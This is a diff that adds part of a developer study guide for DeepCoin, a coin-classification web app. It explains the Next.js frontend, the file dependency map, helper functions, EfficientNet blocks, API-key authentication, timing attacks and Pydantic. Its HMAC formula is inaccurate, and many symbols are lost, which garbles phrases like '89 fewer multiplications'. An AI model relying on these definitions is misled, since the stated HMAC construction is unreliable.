+- Sends JavaScript to the browser. Gets executed in the user's browser.
+
+```typescript
+// Server Component  fetch data, render HTML, send to browser:
+export default async function HistoryPage() {
+    return <Suspense><HistoryContent /></Suspense>  // passes off to client
+}
+
+// Client Component  interactive part:
+"use client"
+export function HistoryContent() {
+    const [page, setPage] = useState(1)             // useState = client only
+    const params = useSearchParams()                // browser API = client only
+    ...
+}
+```
+
+**Hydration** = after the server sends static HTML to the browser, React "wakes up"
+the client components by attaching event handlers to the existing HTML. The page looks
+populated before hydration (SSR HTML) but isn't interactive. After hydration: interactive.
+
+**SSR (Server-Side Rendering)** = generating the HTML for a page on the server before
+sending it. The user sees content immediately (no blank white flash). SEO benefits because
+search engine crawlers see the rendered HTML.
+
+---
+
+### What Is Tailwind CSS?
+
+Traditional CSS:
+```css
+/* styles.css */
+.badge {
+    display: inline-flex;
+    align-items: center;
+    border-radius: 9999px;
+    padding: 4px 12px;
+    font-size: 0.75rem;
+    font-weight: 600;
+    background-color: rgba(16, 185, 129, 0.2);
+    color: rgb(52, 211, 153);
+}
+```
+
+**Tailwind CSS** generates atomic utility classes  one class per CSS property:
+```typescript
+<span className="inline-flex items-center rounded-full px-3 py-1 text-xs font-semibold bg-emerald-500/20 text-emerald-400">
+```
+
+Each class name is self-describing: `rounded-full` = border-radius: 9999px, `px-3` = padding-left + padding-right: 12px, `text-xs` = font-size: 0.75rem.
+
+**Why Tailwind:**
+- No context-switching between `.tsx` and `.css` files
+- No class name collisions (each class has one fixed meaning)
+- Dead code elimination: unused classes are removed from the final CSS file
+- Dark mode support: `dark:bg-gray-900` automatically applies in dark mode
+
+**Trade-off:** Class names in JSX become long strings of Tailwind classes. This is why
+CVA (Class Variance Authority) was introduced  to manage variant-specific class lists.
+
+---
+
+### What Is Flexbox?
+
+**Flexbox** is a CSS layout mode. It lets you arrange elements in a row or column,
+with control over alignment, spacing, and proportions.
+
+```css
+.container {
+    display: flex;          /* activate flexbox */
+    flex-direction: row;    /* children in a row (default) */
+    align-items: center;    /* center children vertically */
+    gap: 8px;              /* space between children */
+}
+```
+
+In Tailwind: `flex items-center gap-2 justify-between`
+
+DeepCoin uses Flexbox throughout for layouts:
+- History table rows: `<div className="flex items-center gap-2">`  Link + delete button side by side
+- Agent pipeline: `flex flex-row gap-8`  4 stations in a row
+- Badge + percentage: `flex items-center gap-3`  badge and number aligned
+
+The alternative to Flexbox is CSS Grid (for 2D layouts). Flexbox = 1D (one row OR one column).
+Grid = 2D (rows AND columns). DeepCoin uses both where appropriate.
+
+---
+
+### What Is a Blob URL?
+
+When a user selects a file in `<input type="file">`, the browser holds the file in memory
+as a `Blob` (Binary Large Object). You cannot display a Blob directly in an `<img>` tag.
+
+`URL.createObjectURL(blob)` creates a special browser-internal URL that points to the Blob:
+```
+blob:http://localhost:3000/f1e2d3c4-a5b6-7890-cdef-123456789abc
+```
+
+You CAN use this in an `<img src={blobUrl}>`  the browser resolves it to the in-memory Blob
+and displays the image without uploading it to any server.
+
+**Memory management:** The Blob URL keeps the Blob in memory until:
+1. You call `URL.revokeObjectURL(blobUrl)`  explicit cleanup
+2. The page unloads  browser cleanup
+
+Without cleanup: every file a user previews stays in memory forever (during the session).
+DeepCoin uses `useEffect` with a cleanup return to revoke the URL when the component unmounts:
+```typescript
+useEffect(() => {
+    const url = URL.createObjectURL(file)
+    setPreviewUrl(url)
+    return () => URL.revokeObjectURL(url)   // will run when component unmounts
+}, [file])
+```
+
+---
+
+## PART 4  File Relationship Map: What Calls What
+
+This is the complete dependency graph. Read it top-to-bottom to understand which files
+depend on which other files. If you modify a file, any file that imports it may be affected.
+
+---
+
+### Backend File Dependencies
+
+```
+src/api/main.py
+    imports:  src/api/auth.py             (require_api_key dependency)
+    imports:  src/api/limiter.py           (limiter + SlowAPIMiddleware)
+    imports:  src/api/logging_config.py    (configure_logging)
+    imports:  src/api/routes/classify.py   (router with POST /classify)
+    imports:  src/api/routes/history.py    (router with GET/DELETE /history)
+    imports:  src/agents/gatekeeper.py     (Gatekeeper class for app.state.gk)
+
+src/api/routes/classify.py
+    imports:  src/api/auth.py             (require_api_key)
+    imports:  src/api/limiter.py           (limiter for rate limiting decorator)
+    imports:  src/api/schemas.py           (ClassifyResponse Pydantic model)
+    imports:  src/api/_store.py            (append to persist history)
+    calls:    gatekeeper.analyze()         (the entire CNN+agent pipeline)
+
+src/api/routes/history.py
+    imports:  src/api/auth.py             (require_api_key for DELETE)
+    imports:  src/api/schemas.py           (ClassifyResponse, HistoryListResponse)
+    imports:  src/api/_store.py            (load_page, get_by_id, delete_by_id)
+
+src/agents/gatekeeper.py
+    imports:  src/core/inference.py        (CoinInference CNN)
+    imports:  src/agents/historian.py      (Historian agent)
+    imports:  src/agents/validator.py      (Validator agent)
+    imports:  src/agents/investigator.py   (Investigator agent)
+    imports:  src/agents/synthesis.py      (Synthesis agent + PDF)
+
+src/agents/historian.py
+    imports:  src/core/rag_engine.py       (get_by_id, get_context_blocks)
+    calls:    Gemini/Ollama/Fallback LLM   (external API call)
+
+src/agents/validator.py
+    imports:  src/core/rag_engine.py       (get_by_id for expected metal)
+    uses:     OpenCV HSV color analysis    (no external API)
+
+src/agents/investigator.py
+    imports:  src/core/rag_engine.py       (search for KB matches)
+    calls:    Gemini Vision OR OpenCV      (vision LLM or local fallback)
+
+src/agents/synthesis.py
+    imports:  fpdf2                        (direct PDF generation)
+    uses:     CoinState dict from gatekeeper (all agent results)
+
+src/core/inference.py
+    imports:  src/core/model_factory.py    (get_deepcoin_model)
+    loads:    models/best_model.pth        (trained weights)
+    loads:    models/class_mapping.pth     (idx_to_class dict)
+    uses:     OpenCV                       (CLAHE + auto-crop)
+
+src/core/rag_engine.py
+    loads:    data/metadata/cn_types_metadata_full.json   (9541 coin records)
+    connects: data/metadata/chroma_db_rag/               (ChromaDB 47705 vectors)
+    uses:     sentence-transformers all-MiniLM-L6-v2     (text embeddings)
+    uses:     rank-bm25 BM25Okapi                        (keyword index)
+```
+
+---
+
+### Frontend File Dependencies
+
+```
+app/layout.tsx
+    wraps ALL pages with: QueryClientProvider (TanStack Query)
+    provides: global font, global CSS
+
+app/page.tsx  (route: "/")
+    uses: CoinUploader.tsx       (file upload UI)
+    uses: AgentPipeline.tsx      (mission control modal)
+    uses: AnalysisPanel.tsx      (results display)
+    reads from: lib/store.ts     (phase  which panel to show)
+
+app/history/page.tsx  (route: "/history")
+    uses: HistoryTable.tsx       (the table component)
+    wraps in Suspense            (for useSearchParams)
+
+app/history/[id]/page.tsx  (route: "/history/abc-123")
+    uses: lib/api.ts             (getHistoryItem fetch)
+    displays: full ClassifyResponse data (CN links, stats strip, copy button)
+
+components/CoinUploader.tsx
+    reads from:  lib/store.ts    (tta toggle, setCancelFn, setPhase)
+    calls:       lib/api.ts      (classifyCoin)
+    creates:     AbortController (registers in store._cancelFn)
+
+components/AgentPipeline.tsx
+    reads from:  lib/store.ts    (phase, uploadProgress, _cancelFn)
+    displays:    4 stations + mission control log
+    the X button calls:  store._cancelFn() then store.reset()
+
+components/AnalysisPanel.tsx
+    reads from:  lib/store.ts    (result: ClassifyResponse)
+    uses:        react-countup   (confidence number animation)
+    uses:        framer-motion   (bar animations)
+    renders:     CnnSection, HistorianSection, ValidatorSection, InvestigatorSection
+
+components/HistoryTable.tsx
+    uses:        TanStack useQuery     (fetches GET /api/history)
+    uses:        TanStack useMutation  (calls DELETE /api/history/{id})
+    calls:       lib/api.ts            (getHistory, deleteHistoryItem)
+
+components/HealthDot.tsx
+    calls:       lib/api.ts (getHealthStatus  GET /api/health every 30 seconds)
+    shows:       green dot (healthy) / red dot (degraded) / gray dot (connecting)
+    used in:     app/layout.tsx navigation bar
+
+lib/store.ts
+    imported by: CoinUploader, AgentPipeline, AnalysisPanel (all three)
+    bridges:     CoinUploader (sets _cancelFn)  AgentPipeline (reads _cancelFn)
+
+lib/api.ts
+    imported by: CoinUploader, HistoryTable, HistoryDetail page, HealthDot
+    configures:  classifyApiClient (direct to port 8000)
+    configures:  apiClient         (proxied through Next.js)
+
+lib/utils.ts
+    exports: cn(...classes: string[]) utility function
+    cn() combines class names intelligently using clsx + tailwind-merge
+    WHAT clsx does: filters out falsy values
+        cn("base", isActive && "active", undefined)    "base active"
+    WHAT tailwind-merge does: removes Tailwind class conflicts
+        cn("px-2 px-4")    "px-4"  (last value wins, no duplicate)
+    used by: EVERY component that has conditional Tailwind classes
+
+types/api.ts
+    exported interfaces: ClassifyResponse, CnnResult, Top5Item, HistoryListResponse, etc.
+    imported by: all components that display or process API data
+    must stay in sync with: src/api/schemas.py (manual sync, no codegen)
+
+next.config.ts
+    configures: security headers applied to ALL routes
+    configures: rewrites (/api/*  FastAPI)
+    configures: devIndicators: false
+    read by: Next.js build system (not imported by any component)
+```
+
+---
+
+### Test File Dependencies
+
+```
+tests/unit/test_store.py
+    tests: src/api/_store.py (append, load_all, get_by_id, count, delete_by_id, load_page)
+    uses:  tempfile (creates a temp SQLite file, cleaned up after tests)
+    does NOT use: any API routes or agents
+
+tests/unit/test_api_security.py
+    tests: src/api/routes/classify.py (_sanitise_filename, _detect_mime)
+    imports: those functions directly (not via HTTP)
+
+tests/unit/test_auth.py
+    tests: src/api/auth.py (require_api_key) via TestClient
+    uses:  fastapi.testclient.TestClient
+    covers: 8 scenarios (dev mode, correct key, wrong key, missing key, timing safety)
+```
+
+---
+
+### The Data Flow Direction (Summary Diagram)
+
+```
+User's browser
+   Photo file selected
+CoinUploader.tsx
+   downsizeImage (canvas, max 1024px, JPEG 0.85)
+   quality check (Laplacian variance blur detection)
+   POST /api/classify (classifyApiClient  direct to FastAPI port 8000)
+    
+    --- FastAPI boundary ---
+    main.py middleware (CORS, GZip, X-Request-ID)
+    limiter.py (10/min per IP)
+    auth.py (X-API-Key check)
+    classify.py (Content-Type  size cap  magic bytes  UUID save)
+    asyncio.to_thread(gk.analyze)
+      
+      --- gatekeeper.py (LangGraph) ---
+      inference.py: CLAHE  auto-crop  letterbox  BGRRGB  EfficientNet-B3 TTA
+      route decision: confidence + vote_fraction
+      
+      historian.py  (if >0.85):
+        rag_engine.py: BM25 + ChromaDB search  5 context blocks
+        LLM call (GitHub/Google/Ollama/fallback)
+      OR
+      validator.py  (0.400.85):
+        rag_engine.py: expected material lookup
+        OpenCV: multi-scale HSV analysis
+      OR
+      investigator.py  (<0.40):
+        rag_engine.py: full 9541-type search
+        OpenCV fallback: HSV metal + Sobel edge density
+      
+      synthesis.py: PDF generation (fpdf2 direct draw, _GREEK_MAP)
+      
+      CoinState dict assembled
+    
+    ClassifyResponse built (Pydantic serialization  JSON)
+    _store.py: INSERT INTO history (SQLite WAL)
+    save_path.unlink()  uploaded file deleted
+    GZip compression (3.2 KB  1.1 KB)
+    HTTP 200 + JSON body
+     back to browser
+store.ts: setResult(response)
+AnalysisPanel.tsx: 3-state CNN display, historian/validator/investigator sections
+PDF link: GET /api/reports/{filename}  serve PDF file
+```
+
+---
+
+## PART 5  Functions That Were Mentioned But Never Fully Explained
+
+---
+
+### `_auto_crop_coin()` in `src/core/inference.py`
+
+**What**: Detects the coin's circular boundary in the image and crops to just the coin.
+
+**Why**: A user photographs a coin on a table. The image includes the table, shadows, and
+margins. These irrelevant pixels confuse the CNN  it has to "find" the coin within the frame.
+Auto-cropping removes the background so 100% of the 299299 input is coin.
+
+**How (three strategies in order):**
+1. **HoughCircles** (cv2.HoughCircles): A transform that detects circles by voting.
+   Every edge pixel votes for circles it might be part of. Circles with many votes = detected.
+   Best for coins on clean, high-contrast backgrounds.
+
+2. **Contour circularity**: Find all contours (closed curves) in the image. For each contour,
+   compute `circularity = 4π  area / perimeter²`. A perfect circle has circularity = 1.0.
+   A square has circularity = π/4  0.785. Keep the contour with circularity > 0.7.
+   Better for coins on textured backgrounds where HoughCircles fails.
+
+3. **Centre 80% crop** (fallback): If neither strategy found a circle, assume the coin
+   is centred in the image and crop the middle 80%. Not perfect but better than full frame.
+
+All crops add 12% padding: a coin whose edge is exactly at the border would lose detail.
+12% margin ensures the entire coin is visible.
+
+---
+
+### `_letterbox()` in `src/data_pipeline/prep_engine.py`
+
+**What**: Resizes an image to 299299 while preserving the aspect ratio, padding with black.
+
+**Why**: Simple stretch-to-fit distorts the coin. A round coin becomes an oval. Proportions
+that the CNN learned (head size relative to coin diameter, legend arc radius) are destroyed.
+
+**How**:
+```python
+def _letterbox(img, target=299):
+    h, w = img.shape[:2]
+    scale = target / max(h, w)                    # scale to fit longest edge
+    new_h, new_w = int(h * scale), int(w * scale) # new dimensions
+    resized = cv2.resize(img, (new_w, new_h), interpolation=cv2.INTER_AREA)
+    canvas = np.zeros((target, target, 3), dtype=np.uint8)  # black 299299
+    top  = (target - new_h) // 2                  # center vertically
+    left = (target - new_w) // 2                  # center horizontally
+    canvas[top:top+new_h, left:left+new_w] = resized
+    return canvas
+```
+The coin occupies the largest possible area without distortion. Black bars fill the rest.
+The CNN was trained on this format  inference must match exactly.
+
+---
+
+### `_strip_wait_loops()` and `_cap_sections()` in `src/agents/synthesis.py`
+
+**`_strip_wait_loops()`**: Some LLMs (especially reasoning models like deepseek-r1) include
+their internal "thinking" text before the actual answer:
+```
+"Let me think about this... First, I consider the obverse description...
+Wait, I need to check the legend... Actually the legend says MAR...
+Based on this reasoning, here is the analysis: The Maroneia drachm..."
+```
+The wait-loop text is not for the user  it's the model's scratchpad. `_strip_wait_loops()`
+removes lines containing "Let me", "Wait", "Actually", "I need to", etc. before rendering to PDF.
+
+**`_cap_sections()`**: The LLM sometimes writes 4 paragraphs when we asked for 3. Long text
+overflows the PDF table cells. `_cap_sections()` truncates each section block to 350 characters
+to guarantee it fits within the PDF's table layout.
+
+---
+
+### `_enrich_label()` in `src/agents/synthesis.py`
+
+**What**: Converts a raw CN type ID into a human-readable coin name.
+
+**Why**: The top-5 table in the PDF could show:
+```
+Rank 1: label="1015"   confidence=91.1%
+Rank 2: label="3987"   confidence=3.1%
+```
+These numbers mean nothing to a historian or curator. `_enrich_label()` queries the RAG engine:
+```
+"1015"  "CN 1015  drachm  Maroneia (365330 BC)"
+"3987"  "CN 3987  tetradrachm  Thasos (148 BC)"
+```
+The PDF now shows meaningful coin descriptions, not opaque numbers.
+
+---
+
+### `HealthDot.tsx` in `frontend/components/`
+
+**What**: A tiny colored circle in the navigation header that shows the backend status.
+
+**How**: Polls `GET /api/health` every 30 seconds using `setInterval()`.
+- Green dot + "Operational": status === "healthy"
+- Red dot + "Degraded": status === "degraded"
+- Gray dot + "Connecting...": initial state before first health check
+
+**Why** it had a bug (commit `cf3be7f`):
+The health endpoint returns `{"status": "healthy"}`. The HealthDot checked `status === "ok"`.
+That's wrong  "ok" is never returned. The dot always showed "Connecting..." even when healthy.
+Fix: change check to `status === "healthy"`.
+
+**Connection in the codebase**: `app/layout.tsx` renders `<HealthDot />` inside the nav bar.
+It is a Client Component (`"use client"`) because `setInterval` is a browser API (not available server-side).
+
+---
+
+### `app/layout.tsx`  The Root Layout
+
+```typescript
+// app/layout.tsx  SERVER COMPONENT, wraps ALL pages
+export default function RootLayout({ children }: { children: React.ReactNode }) {
+    return (
+        <html lang="en">
+            <body className={`${geistSans.variable} antialiased`}>
+                <QueryClientProvider client={queryClient}>   {/* TanStack Query context */}
+                    <nav>
+                        <Link href="/">DeepCoin</Link>
+                        <Link href="/history">History</Link>
+                        <HealthDot />                        {/* live status indicator */}
+                    </nav>
+                    {children}                               {/* page.tsx content here */}
+                </QueryClientProvider>
+            </body>
+        </html>
+    )
+}
+```
+
+`children` is React's term for "whatever page is currently being rendered."
+When you navigate to `/history`, `children` = `<HistoryPage />`.
+When you navigate to `/`, `children` = the upload/classify page.
+
+The `QueryClientProvider` must wrap ALL pages so that `useQuery` and `useMutation` hooks
+work on any page. It provides the TanStack Query cache to the entire component tree.
+Without it, `useQuery` would throw: "No QueryClient set, use QueryClientProvider."
+
+---
+
+---
+
+## PART 6  Three More Things That Need a Real Explanation
+
+---
+
+### MBConv: The Building Block Inside EfficientNet
+
+MBConv stands for **Mobile Inverted Bottleneck Convolution**. It is the fundamental unit
+that EfficientNet-B3 is built from  the model has 18 MBConv blocks stacked on top of each other.
+
+Let's break down the name:
+
+**"Convolution"** = the basic operation of deep neural networks for images. A small "filter"
+(typically 33 pixels) slides across the image, multiplying its values with the pixels it
+covers and summing them up. This detects local patterns like edges, textures, and shapes.
+
+**"Depthwise Convolution"** = a more efficient variant. Standard convolution mixes ALL channels
+at once (RGB output mixes with RGB input across all feature maps). Depthwise applies one
+filter PER channel independently, then a 11 convolution mixes the channels.
+This achieves similar results with 89 fewer multiplications.
+
+**"Bottleneck"** = a pattern where you:
+1. Expand the number of channels (6, e.g., 32  192)
+2. Process the expanded channels with depthwise convolution
+3. Project back down to the original channel count (192  32)
+
+Like a sand-timer shape: wide-narrow-wide. Allows the network to temporarily work in a
+higher-dimensional space (more detail), then compress back down (more efficient).
+
+**"Inverted Bottleneck"** = the "inverted" refers to the fact that standard bottlenecks
+compress FIRST then expand. MBConv does the OPPOSITE: expand first, then compress.
+This keeps the residual connection (the skip path that adds input directly to output)
+on the NARROWER side, which is more efficient for mobile deployment.
+
+**"Mobile"** = designed for mobile devices where RAM and compute are limited.
+
+**Squeeze-and-Excitation (SE)** = an attention mechanism added INSIDE each MBConv block:
+1. **Squeeze**: average-pool each entire feature map to a single number ("how active is this channel overall?")
+2. **Excitation**: pass those numbers through two small linear layers to learn weights per channel
+3. **Scale**: multiply each channel's feature map by its learned weight
+
+Result: the network learns WHICH feature maps matter most for the current image. For a coin
+with a distinctive eagle on the reverse, SE will amplify the channels that detect eagle-like shapes and suppress channels irrelevant to this classification.
+
+This is why EfficientNet outperforms older architectures of the same size  it actively
+prioritizes relevant features rather than weighting all channels equally.
+
+---
+
+### Bearer Tokens, JWT, and OAuth2  How Authentication Works Elsewhere
+
+DeepCoin uses simple **X-API-Key** authentication. But you'll encounter these terms in every
+other API you work with, so they need explaining.
+
+**Bearer Token**: An HTTP authentication scheme. "Bearer" means "whoever holds this token can use it."
+```
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+```
+The token is passed in the `Authorization` header with the word "Bearer" before it.
+Anyone who intercepts this token can use your API. HTTPS (encrypted transport) prevents
+interception in transit. Logout = revoke the token on the server.
+
+**JWT (JSON Web Token)**: A specific format for Bearer tokens. Three Base64-encoded segments:
+```
+eyJhbGci...    Header (algorithm used: HS256)
+.eyJzdWIi...    Payload (claims: user ID, email, expiry time, roles)
+.SflKxwRJSM    Signature (HMAC of Header+Payload with a secret key)
+```
+
+The server can VERIFY a JWT without looking it up in a database:
+1. Re-compute the signature from Header+Payload using the secret key
+2. Compare to the signature embedded in the token
+3. If they match  token was issued by this server  trusted
+
+JWT is "stateless authentication." No database lookup = fast at scale.
+Downside: if a JWT is stolen before it expires, you can't revoke it easily.
+
+**OAuth2**: A standard for DELEGATED authorization. Think "Login with Google."
+You don't give your Google password to DeepCoin. Instead:
+1. You visit DeepCoin  it redirects you to Google  you log in to Google (on Google's page)
+2. Google asks: "Allow DeepCoin to see your email and profile?"
+3. You say yes  Google gives DeepCoin a short-lived Bearer token for YOUR Google data
+4. DeepCoin uses that token to call Google's API on your behalf
+
+OAuth2 is NOT used in DeepCoin. DeepCoin uses a simpler pre-shared key approach:
+- `DEEPCOIN_API_KEY` is set in `.env` on the server
+- The frontend/client must include `X-API-Key: <that key>` in every request
+- No user identity, no login flow, no expiry  just "you know the key or you don't"
+
+Why simple key in DeepCoin? It's an internal system (one user = Dhia). OAuth2 would be
+engineering overkill. Scale the auth system when you need user accounts.
+
+---
+
+### Swagger UI and OpenAPI: The Interactive API Documentation
+
+When you run the FastAPI server, navigate to `http://localhost:8000/docs` in a browser.
+You'll see an interactive page  this is **Swagger UI**.
+
+**OpenAPI** = a standard format (JSON or YAML) that describes an API:
+- What endpoints exist (`POST /api/classify`)
+- What parameters they accept (a file, a boolean `tta`)
+- What they return (a `ClassifyResponse` schema)
+- What authentication they require (X-API-Key header)
+
+FastAPI generates the OpenAPI specification AUTOMATICALLY from your code. It reads:
+- Your route decorators (`@app.post("/api/classify")`)
+- Your Pydantic schemas (`ClassifyResponse`, `CnnResult`, etc.)
+- Your dependency declarations (`Depends(require_api_key)`)
+- Your docstrings
+
+**Swagger UI** = a web page that reads the OpenAPI JSON and renders it as a clickable interface.
+You can:
+- See every endpoint with descriptions
+- Click "Try it out"  fill in parameters  send a real API request  see the real response
+- See the exact schema for every response
+
+**Why ENV-gated in DeepCoin:**
+In production (`ENV=production`), `main.py` sets:
+```python
+docs_url = None if os.getenv("ENV") == "production" else "/docs"
+```
+This disables Swagger UI in production. An attacker with access to `/docs` sees your ENTIRE
+API surface: all endpoints, all schemas, the exact format to craft attacks. In dev mode,
+Swagger UI is priceless for testing. In production, it's a reconnaissance gift.
+
+---
+
+### `_check_image_quality()`  Browser-Side Quality Gate
+
+This function runs INSIDE the browser (in `CoinUploader.tsx`), BEFORE uploading to FastAPI.
+
+```typescript
+function _check_image_quality(imageData: ImageData): QualityResult {
+    // 1. Resolution check
+    if (imageData.width < 100 || imageData.height < 100) {
+        return { ok: false, warning: "Image too small (minimum 100100 pixels)" }
+    }
+
+    // 2. Blur detection via Laplacian variance
+    // Laplacian = edge detection filter: [0,1,0; 1,-4,1; 0,1,0]
+    // Applied to grayscale version of the image
+    // Sharp image  many strong edges  HIGH variance
+    // Blurry image  no sharp edges  LOW variance
+    const variance = computeLaplacianVariance(imageData)
+    if (variance < 80) {
+        return { ok: false, warning: `Image appears blurry (sharpness score: ${variance.toFixed(0)})` }
+    }
+    return { ok: true, warning: null }
+}
+```
+
+**Laplacian variance** measures image sharpness:
+- Apply the Laplacian kernel (edge detector) to every pixel
+- Compute the variance (spread) of the resulting values
+- High variance = many distinct edges = sharp image
+- Low variance = all values similar = blurry image
+- Threshold 80 was chosen empirically: below 80, the CNN confidence drops significantly
+
+This quality check is shown as an amber warning banner in the UI. It does NOT block
+the upload  the user can proceed anyway. It informs but doesn't restrict.
+
+---
+
+### `_probe_ollama_model()`  Startup Safety Check
+
+This function runs ONCE when `Gatekeeper.__init__()` is called (at server startup, not at request time).
+
+```python
+def _probe_ollama_model(self, model_name: str) -> bool:
+    """
+    Calls GET http://localhost:11434/api/tags to get the list of downloaded Ollama models.
+    Returns True if model_name is in the list. Logs a WARNING if not found.
+
+    WHY: If we don't probe at startup, the first classify request that tries to use Ollama
+    will hang for 10+ minutes (Ollama tries to pull the model, which is 2-4 GB).
+    The probe detects this condition at startup and falls through to the next LLM provider.
+    """
+    try:
+        import requests
+        resp = requests.get("http://localhost:11434/api/tags", timeout=2)
+        if resp.ok:
+            models = [m["name"] for m in resp.json().get("models", [])]
+            if model_name not in models:
+                logger.warning("Ollama model '%s' not downloaded. Skipping Ollama.", model_name)
+                return False
+            return True
+    except Exception:
+        logger.warning("Ollama not reachable at localhost:11434. Skipping Ollama.")
+    return False
+```
+
+**Why this matters:** In the LLM provider chain, Ollama is ranked first (lowest latency  runs locally).
+If `gemma3:4b` is not downloaded, Ollama will try to pull it on first use (like `ollama pull gemma3:4b`).
+That pull is 2.4 GB and takes 15+ minutes. The user's classify request will just show a spinning
+loader while the download happens invisibly. No error. Just a hang.
+
+The probe catches this early. At startup, if Ollama is unreachable or the model isn't downloaded,
+the historian/investigator immediately skips to the next provider (GitHub Models or Google Gemini).
+Zero user-visible hang.
+
+---
+
+## PART 7  The Complete Pydantic Explanation
+
+### What Is Pydantic?
+
+**Pydantic** is a Python library for data validation. You define the shape of data you expect
+using Python type hints, and Pydantic enforces it automatically.
+
+Without Pydantic:
+```python
+@app.post("/api/classify")
+async def classify(request: Request):
+    body = await request.json()
+    tta = body.get("tta")          # might be None, might be "true" (string), might be 1
+    if tta is None:
+        tta = False
+    elif tta == "true":            # have to handle every possible input format manually
+        tta = True
+    ...
+```
+
+With Pydantic (FastAPI uses this automatically):
+```python
+class ClassifyRequest(BaseModel):
+    tta: bool = False              #  Pydantic converts "true"/"false"/1/0 automatically
+
+@app.post("/api/classify")
+async def classify(form: ClassifyRequest):
+    tta = form.tta                 # guaranteed to be a Python bool, validated
+```
+
+**Pydantic v2 in DeepCoin (`src/api/schemas.py`):**
+```python
+class CnnResult(BaseModel):
+    class_id: int
+    label: str
+    confidence: float
+    top5: list[Top5Item]
+    vote_fraction: float | None = None    # optional field  None is valid
+    tta_passes: int = 0
+    temperature: float = 1.0
+
+class ClassifyResponse(BaseModel):
+    id: str
+    timestamp: str
+    cnn: CnnResult
+    route_taken: str
+    historian_result: dict | None = None
+    validator_result: dict | None = None
+    investigator_result: dict | None = None
+    pdf_filename: str | None = None
+```
+
+When FastAPI returns a `ClassifyResponse` object:
+1. Pydantic validates all fields (type-checks, fills in defaults)
+2. FastAPI calls `.model_dump()` to serialize to a Python dict
+3. FastAPI JSON-encodes that dict and sends it as the HTTP response body
+
+`float | None` = the field can be a float OR None (Python's `Optional[float]`).
+`= None` = the default value is None (the field is optional in input/output).
+
+**Pydantic also validates INCOMING requests** in FastAPI automatically. If the client
+sends `confidence: "high"` but the schema says `float`, FastAPI returns `422 Unprocessable Entity`
+with a detailed error explaining exactly which field failed and why.
+
+---
+
+## PART 8  Final Glossary for Terms Mentioned But Not Defined
+
+---
+
+### What is `HMAC`?
+
+**HMAC** = Hash-based Message Authentication Code.
+
+It's a way to verify that a message wasn't tampered with AND came from someone who knows the secret key.
+
+```python
+hmac.new(key=secret, msg=provided_key, digestmod=hashlib.sha256).hexdigest()
+```
+
+**How SHA-256 hashing works (simplified):**
+The SHA-256 function takes any input (a file, a string) and produces a fixed 64-character
+hexadecimal string. Even a one-character change in input produces a completely different output.
+This "avalanche effect" makes it impossible to reverse-engineer the input from the output.
+SHA-1 produces 40 characters; SHA-256 produces 64 characters. SHA-256 is stronger.
+
+**HMAC wraps SHA-256 with a secret key:**
+```
+HMAC(secret_key, message) = SHA-256(secret_key + SHA-256(secret_key + message))
+```
+Only someone who knows `secret_key` can produce the correct HMAC for a given message.
+Without the key, an attacker cannot forge a valid HMAC.
+
+**In `src/api/auth.py` (`hmac.compare_digest`):**
+```python
+import hmac
+expected = stored_api_key.encode()
+provided = request_header_value.encode()
+if hmac.compare_digest(expected, provided):
+    pass  # authenticated
+```
+
+`hmac.compare_digest` compares byte strings in CONSTANT TIME.
+**Why constant time matters:** A naive `==` comparison short-circuits  it stops at the
+first byte that differs. An attacker can measure response time:
+- Wrong key: returns in 0.0001ms (failed at byte 1)
+- Better key: returns in 0.0003ms (failed at byte 3)
+By timing thousands of guesses, the attacker learns which bytes are correct  a "timing attack."
+`compare_digest` always compares ALL bytes before returning, so the time is the same
+whether the key is completely wrong or off by one character.
+
+**XOR**: The underlying operation inside `compare_digest`. `XOR` of two bits returns 1 if
+they DIFFER and 0 if they MATCH. By XOR-ing all bits of the two strings and OR-ing the results,
+you get 0 only if every single bit matched  without short-circuiting.
+
+---
+
+### The SHA-1 Git Connection (Why Commit IDs Look Like `9622f66`)
+
+Git uses SHA-1 to identify EVERYTHING it stores:
+- Every file you commit  SHA-1 hash of the file contents
+- Every directory  SHA-1 hash of its contents and child hashes
+- Every commit  SHA-1 hash of: (tree hash + parent commit hash + author + timestamp + message)
+
+This means:
+```
+Commit "9622f66..." uniquely identifies this exact snapshot:
+  - Every file's exact contents
+  - The exact parent commit
+  - The exact author, time, and message
+```
+
+If you change ONE character in ONE file, the file hash changes  the tree hash changes 
+the commit hash changes. This is why Git commits are immutable  you cannot silently edit
+a commit without changing its hash.
+
+The 40-character SHA-1 hash is shortened to 7 characters (e.g., `9622f66`) in most displays,
+since 7 characters is enough to be unique within a typical project's commit history.
+
+---
+
+### What Is a "Module" vs a "Package" in Python?
+
+**Module** = a single `.py` file. When you `import inference`, Python loads `inference.py`.
+
+**Package** = a directory containing an `__init__.py` file. `src/agents/` is a package
+because `src/agents/__init__.py` exists. You can import from it with `from src.agents import gatekeeper`.
+
+**`__init__.py`**: A file that tells Python "this directory is a package." It can be empty
+or contain package-level initialization code. In DeepCoin, `src/__init__.py` contains:
+```python
+__version__ = "0.4.0"
+```
+This makes the version accessible as `import src; src.__version__`.
+
+---
+
+### What Are Logits?
+
+**Logits** = the raw output numbers from the last LINEAR layer of a neural network,
+BEFORE applying softmax.
+
+```
+EfficientNet's classifier layer outputs: [8.3, 2.1, 1.5, ...]   logits (438 numbers)
+Softmax converts to:                      [0.91, 0.03, 0.02, ...]   probabilities (sum = 1.0)
+```
+
+Logits can be any positive or negative number. Softmax squashes them to [0,1] with sum=1.
+Higher logit = higher probability, but the relationship is exponential (not linear).
+
+In temperature scaling:
+```python
+probs = softmax(logits / temperature)
+```
+Dividing by temperature T > 1 makes the logits smaller  softmax output is "flatter"
+(less confident). Dividing by T < 1 makes logits larger  softmax output is "sharper"
+(more confident).
+
+---
+
+### What Is Cosine Similarity?
+
+When searching the vector database (ChromaDB), similarity between two vectors is measured
+with **cosine similarity**:
+
+```
+cosine_similarity(A, B) = (A  B) / (|A|  |B|)
+```
+where `` is the dot product and `|A|` is the vector's magnitude (length).
+
+Result is always between -1 and +1:
+- 1.0 = vectors point in exactly the same direction = semantically identical
+- 0.0 = vectors are perpendicular = unrelated meanings
+- -1.0 = vectors point in opposite directions = opposite meanings
+
+Why cosine (not Euclidean distance)?
+Cosine ignores the magnitude (length) of the vector and only cares about direction.
+Two descriptions of the same coin written at different lengths (50 words vs 200 words)
+would have different magnitude vectors but similar DIRECTION  cosine similarity is high.
+Euclidean distance would penalize the length difference unfairly.
+
+ChromaDB returns `distance` (lower = more similar). The RAG engine converts:
+`similarity = 1.0 - distance`  1.0 = identical, 0.0 = unrelated.
+
+---
+
+### What Is BM25?
+
